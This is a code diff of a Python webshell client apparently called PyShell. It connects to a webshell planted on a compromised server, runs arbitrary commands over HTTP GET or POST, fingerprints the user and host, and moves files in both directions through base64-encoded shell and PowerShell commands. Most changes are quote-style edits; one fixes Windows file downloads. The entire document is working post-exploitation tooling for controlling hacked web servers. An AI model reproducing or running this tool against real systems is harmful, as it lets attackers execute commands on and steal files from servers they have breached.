@@ -13,7 +13,7 @@ def send_command(command, webshell, method, param="code"):
       response = requests.get((webshell), params=params, headers=headers)
    elif (method.upper() == "POST"):
       response = requests.post((webshell), data=params, headers=headers)
-   return response.content.decode(errors='ignore')
+   return response.content.decode(errors="ignore")
 
 if __name__ == "__main__":
  banner = """
@@ -31,12 +31,12 @@ if __name__ == "__main__":
 
  """
 
-print (colored(banner, 'green'))
+print (colored(banner, "green"))
 parser = argparse.ArgumentParser()
-parser.add_argument('url', help='Webshell URL', type=str)
-parser.add_argument('method', help='HTTP Method to execute command (GET or POST)', type=str)
-parser.add_argument('--ps', default=False, action="store_true", help='PowerShell command execution (Only on Windows hosts)')
-parser.add_argument('-p', '--param', default="code", help='Parameter to use with custom WebShell', type=str)
+parser.add_argument("url", help="Webshell URL", type=str)
+parser.add_argument("method", help="HTTP Method to execute command (GET or POST)", type=str)
+parser.add_argument("--ps", default=False, action="store_true", help="PowerShell command execution (Only on Windows hosts)")
+parser.add_argument("-p", "--param", default="code", help="Parameter to use with custom WebShell", type=str)
 args = parser.parse_args()
 
 try:
@@ -44,22 +44,22 @@ try:
     HTTP_METHOD = args.method
     PARAM = args.param
     COMMAND_LIST = ["ls", "dir", "cat", "type", "rm", "del", "file"]
-    whoami = send_command('whoami', WEBSHELL, HTTP_METHOD, PARAM)
-    hostname = send_command('hostname', WEBSHELL, HTTP_METHOD, PARAM)
-    cwd = "" ; slash = '\\'
+    whoami = send_command("whoami", WEBSHELL, HTTP_METHOD, PARAM)
+    hostname = send_command("hostname", WEBSHELL, HTTP_METHOD, PARAM)
+    cwd = "" ; slash = "\\"
     if not slash in whoami:
-       path = send_command('pwd', WEBSHELL, HTTP_METHOD, PARAM)
-       system = "linux" ; slash = '/'
+       path = send_command("pwd", WEBSHELL, HTTP_METHOD, PARAM)
+       system = "linux" ; slash = "/"
     else:
-       path = send_command('(pwd).path', WEBSHELL, HTTP_METHOD, PARAM)
+       path = send_command("(pwd).path", WEBSHELL, HTTP_METHOD, PARAM)
        system = "windows"
 
     while True:
        try:
-          print (colored(" [PyShell] ", "grey", "on_green"), end = '') ; print (colored(" ", "green", "on_blue"), end = '')
-          print (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip()+" ", "grey", "on_blue"), end = '')
-          print (colored(" ", "blue", "on_yellow"), end = '') ; print (colored(path.rstrip()+" ", "grey", "on_yellow"), end = '')
-          print (colored(" ", "yellow"), end = '')
+          print (colored(" [PyShell] ", "grey", "on_green"), end = "") ; print (colored(" ", "green", "on_blue"), end = "")
+          print (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip()+" ", "grey", "on_blue"), end = "")
+          print (colored(" ", "blue", "on_yellow"), end = "") ; print (colored(path.rstrip()+" ", "grey", "on_yellow"), end = "")
+          print (colored(" ", "yellow"), end = "")
           command = input()
           if command == "exit":
              print (colored("Exiting..\n", "red"))
@@ -69,7 +69,7 @@ try:
                 print("\n")
                 continue
              if "clear" in command.split()[0] or "cls" in command.split()[0]:
-                os.system('clear')
+                os.system("clear")
                 continue
              if "upload" in command.split()[0]: 
                 localfile = command.split()[1]
@@ -83,9 +83,9 @@ try:
                    cwd = os.getcwd()
                 print (colored("Uploading file "+ cwd + "/" + localfile +" on "+ remotefile +"..\n", "yellow"))
                 f = open(localfile, "rb") ; rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata)
-                upload = send_command("echo " + str(base64data.rstrip(), "utf8") + (' > ') + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
+                upload = send_command("echo " + str(base64data.rstrip(), "utf8") + (" > ") + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
                 if system == "linux":
-                   send_command("base64 -di " + remotefiletmp + (' > ') + remotefile + " ; rm -f " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
+                   send_command("base64 -di " + remotefiletmp + (" > ") + remotefile + " ; rm -f " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
                 if system == "windows":
                    command = " ; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) > "
                    send_command("$base64 = cat -raw " + remotefiletmp + command + remotefile + " ; rm -force " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
@@ -100,11 +100,12 @@ try:
                    print (colored("Downloading file "+ remotefile +" on "+ cwd + "/" + localfile +"..\n", "yellow"))
                    if system == "linux":
                       base64data = send_command("base64 " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
+                      download = base64.b64decode(base64data)
                    if system == "windows":
-                   	  command = '[Convert]::ToBase64String([IO.File]::ReadAllBytes("'+remotefile+'"))'   
+                   	  command = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+remotefile+"'))" 
                    	  base64data = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
-                   download = base64.b64decode(base64data)
-                   f = open(localfile, "wb") ; f.write(bytes(download)) ; f.close()
+                   	  download = base64.b64decode(base64data).decode("utf-16le", errors="ignore").encode("utf8")
+                   f = open(localfile, "wb") ; f.write(download) ; f.close()
 
                 else:
                    if "cd" in command.split()[0]:
